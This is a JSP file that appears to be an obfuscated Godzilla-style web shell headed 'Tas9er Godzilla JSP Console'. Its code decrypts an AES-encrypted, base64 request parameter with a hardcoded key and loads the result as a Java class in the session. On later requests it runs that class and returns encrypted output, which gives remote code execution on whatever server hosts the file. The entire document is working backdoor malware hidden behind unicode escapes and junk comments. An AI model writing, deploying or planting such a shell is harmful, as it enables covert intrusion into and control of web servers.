Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_HptcR6jEaxQf = "f5fb0b6b77f8ea22";
    String govsb_nHYpFSxsPWMT = "Tas9er";
    class govsb_4 extends /*edusb_B8*/ClassLoader {
        public govsb_4(ClassLoader govsb_NzA) {
            super/*edusb_tYdNarN*/(govsb_NzA);
        }
        public Class govsb_V2kzkFXE1K(byte[] govsb_Tk8ZC0B5bGIqx4L) {
            return super./*edusb_x9pqtW2Z4ENq2*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_GtM0iJ*/(govsb_Tk8ZC0B5bGIqx4L, 432420-432420, govsb_Tk8ZC0B5bGIqx4L.length);
        }
    }
    public byte[] govsb_EK0as5xixJ9VJN(byte[] govsb_j28S1w7DH7FJx, boolean govsb_T3rfoUwSMU) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_dJbUG*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_QK7sR8bdPl = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_JJ8VaZaGg*/("AES");
            govsb_QK7sR8bdPl.init(govsb_T3rfoUwSMU?432420/432420:432420/432420+432420/432420,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_P1RwN4jZ*/SecretKeySpec/*edusb_fVK5g*/(govsb_HptcR6jEaxQf.getBytes(), "AES"));
            return govsb_QK7sR8bdPl.doFinal/*edusb_wO48*/(govsb_j28S1w7DH7FJx);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_l9mXd13gP = java.util.Base64./*edusb_u*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_OCM*/decode(request.getParameter(govsb_nHYpFSxsPWMT));
        govsb_l9mXd13gP = govsb_EK0as5xixJ9VJN(govsb_l9mXd13gP,false);
        if (session.getAttribute/*edusb_r6FpH*/("payload") == null) {
            session.setAttribute("payload", new govsb_4(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_cNwSp8IBRRFE6*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_XL7eA38EGssPY*/.govsb_V2kzkFXE1K(govsb_l9mXd13gP));
        } else {
            request.setAttribute("parameters", govsb_l9mXd13gP);
            java.io.ByteArrayOutputStream govsb_npb2HfYOaUFTO1 = new java.io./*edusb_Ei5RCgHTQjL8wt*/ByteArrayOutputStream();
            Object govsb_rqiww2uBm = /*edusb_0Ej977l*/((Class) session.getAttribute("payload"))./*edusb_zoFC*//*edusb_gAsFS*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_QbBnjxYrL3*/;
            govsb_rqiww2uBm.equals(govsb_npb2HfYOaUFTO1);
            govsb_rqiww2uBm.equals(pageContext);
            response.getWriter().write("0B47B25CCAA1F2335F7DE4F7240D24DC".substring(432420-432420, 16));
            govsb_rqiww2uBm.toString();
            response.getWriter().write(java.util.Base64/*edusb_B*/.getEncoder()/*edusb_p*/.encodeToString(govsb_EK0as5xixJ9VJN(govsb_npb2HfYOaUFTO1.toByteArray(),true)));
            response.getWriter().write("0B47B25CCAA1F2335F7DE4F7240D24DC".substring(16));
        }
    } catch (Exception e) {
    }
%>